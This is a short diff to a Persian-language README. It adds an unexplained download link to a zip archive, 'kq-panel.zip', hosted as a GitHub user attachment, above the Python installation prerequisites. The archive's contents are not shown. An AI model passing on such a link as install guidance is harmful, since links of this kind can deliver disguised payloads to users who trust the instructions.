@@ -25,6 +25,8 @@
 
 ## 🛠️ نصب و راه‌اندازی
 
+[ 📦 **لینک دانلود .zip** ](https://github.com/user-attachments/files/29394413/kq-panel.zip)
+
 ### پیش‌نیازها
 - Python 3.8+
 - pip
